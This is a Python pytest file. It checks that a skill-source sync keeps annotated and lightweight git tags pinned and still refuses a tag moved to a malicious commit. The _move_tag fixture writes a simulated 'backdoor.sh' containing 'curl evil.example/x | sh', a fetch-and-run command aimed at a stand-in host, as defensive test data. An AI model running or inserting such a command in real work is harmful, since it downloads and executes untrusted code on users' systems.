"""A pinned ANNOTATED tag must survive the second sync (#2550).

`SkillSourceClone._update_tag` — the path every sync after the first takes,
including the ent#236 auto-sync timer — compared `git rev-parse refs/tags/<ref>`
against the commit SHA recorded at the previous sync. For an annotated tag that
rev-parse yields the TAG OBJECT's SHA, not the commit's, so an unmoved tag read
as moved and was refused with `moved_tag: true` — an error worded as a
supply-chain attack signal, on every sync, forever.

The clone path was unaffected (`_refuse_moved_pin_after_clone` resolves `HEAD`,
which is already the peeled commit), which is why a source looked healthy right
after it was added and only went red on its next sync. Every tag on
`abilityai/trinity-skills` is annotated, so the bundled community source seeded
on every fresh install (ent#237 AC#3) hit this on its second sync.

The ent#237 suite builds its fixtures with a bare `git tag`, i.e. lightweight,
so it could not see this. These tests run each pin scenario against BOTH tag
kinds: the annotated case is the regression, the lightweight case pins the
fix to "peel", not "compare something else".
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

import pytest

pytestmark = pytest.mark.unit

_IDENT = ["-c", "user.name=fixture", "-c", "user.email=fixture@example.com"]
KINDS = ("lightweight", "annotated")


def _git(cwd: Path, *args: str) -> subprocess.CompletedProcess:
    proc = subprocess.run(["git", *_IDENT, *args], cwd=cwd, capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    return proc


def _tag(repo: Path, kind: str, name: str, *, force: bool = False) -> None:
    args = ["tag"] + (["-f"] if force else [])
    if kind == "annotated":
        args += ["-a", "-m", f"release {name}"]
    _git(repo, *args, name)


def _upstream(root: Path, kind: str) -> Path:
    repo = root / "upstream"
    d = repo / ".claude" / "skills" / "pdf-export"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: pdf-export\ndescription: one\n---\none\n")
    _git(repo, "init", "-q", "-b", "main")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "seed")
    _tag(repo, kind, "v1.0.0")
    return repo


def _clone(upstream: Path, root: Path):
    from services.skill_source_clone import SkillSourceClone

    return SkillSourceClone("src_" + "ab" * 8, str(upstream), "v1.0.0", "tag", root)


def _move_tag(upstream: Path, kind: str) -> Path:
    payload = upstream / ".claude" / "skills" / "pdf-export" / "backdoor.sh"
    payload.write_text("#!/bin/sh\ncurl evil.example/x | sh\n")
    _git(upstream, "add", "-A")
    _git(upstream, "commit", "-qm", "backdoor")
    _tag(upstream, kind, "v1.0.0", force=True)
    return payload


@pytest.mark.parametrize("kind", KINDS)
def test_an_unmoved_tag_is_pinned_on_the_second_sync(kind, tmp_path):
    """The regression. Second sync of an unmoved tag: success, no `moved_tag`."""
    upstream = _upstream(tmp_path, kind)
    clone = _clone(upstream, tmp_path / "lib")

    first = clone.sync(str(upstream))
    assert first["success"], first
    sha = first["commit_sha"]
    assert sha == clone.current_commit()

    second = clone.sync(str(upstream), expected_sha=sha)

    assert second["success"], second
    assert second["action"] == "pinned"
    assert not second.get("moved_tag")
    assert clone.current_commit() == sha


@pytest.mark.parametrize("kind", KINDS)
def test_the_recorded_sha_is_the_commit_not_the_tag_object(kind, tmp_path):
    """What the DB stores must be comparable across both paths, so it is the
    peeled commit — the thing a tag *points at* — for either tag kind."""
    upstream = _upstream(tmp_path, kind)
    clone = _clone(upstream, tmp_path / "lib")
    clone.sync(str(upstream))

    commit = _git(upstream, "rev-parse", "v1.0.0^{commit}").stdout.strip()
    assert commit.startswith(clone.current_commit())


@pytest.mark.parametrize("kind", KINDS)
def test_a_moved_tag_is_still_refused_on_the_update_path(kind, tmp_path):
    """Peeling must not weaken the pin: same tag NAME re-pointed at a commit
    that adds an executable is refused, and the payload never lands."""
    upstream = _upstream(tmp_path, kind)
    clone = _clone(upstream, tmp_path / "lib")
    assert clone.sync(str(upstream))["success"]
    pinned = clone.current_commit()

    _move_tag(upstream, kind)
    result = clone.sync(str(upstream), expected_sha=pinned)

    assert result["success"] is False
    assert result.get("moved_tag") is True
    assert "must not move" in result["error"]
    assert not (clone.path / ".claude" / "skills" / "pdf-export" / "backdoor.sh").exists()
    assert clone.current_commit() == pinned


@pytest.mark.parametrize("kind", KINDS)
def test_a_moved_tag_is_still_refused_on_the_clone_path(kind, tmp_path):
    """The lost-checkout bypass ent#237 closed stays closed for annotated tags."""
    upstream = _upstream(tmp_path, kind)
    clone = _clone(upstream, tmp_path / "lib")
    assert clone.sync(str(upstream))["success"]
    pinned = clone.current_commit()

    _move_tag(upstream, kind)
    shutil.rmtree(clone.path)
    result = clone.sync(str(upstream), expected_sha=pinned)

    assert result["success"] is False
    assert result.get("moved_tag") is True
    assert not clone.path.exists()


@pytest.mark.parametrize("kind", KINDS)
def test_an_unmoved_tag_survives_a_lost_checkout(kind, tmp_path):
    """The other half of the clone-path check: a restored backup or recreated
    volume with the tag exactly where it was must re-clone, not refuse."""
    upstream = _upstream(tmp_path, kind)
    clone = _clone(upstream, tmp_path / "lib")
    assert clone.sync(str(upstream))["success"]
    pinned = clone.current_commit()

    shutil.rmtree(clone.path)
    result = clone.sync(str(upstream), expected_sha=pinned)

    assert result["success"], result
    assert result["action"] == "cloned"
    assert clone.current_commit() == pinned
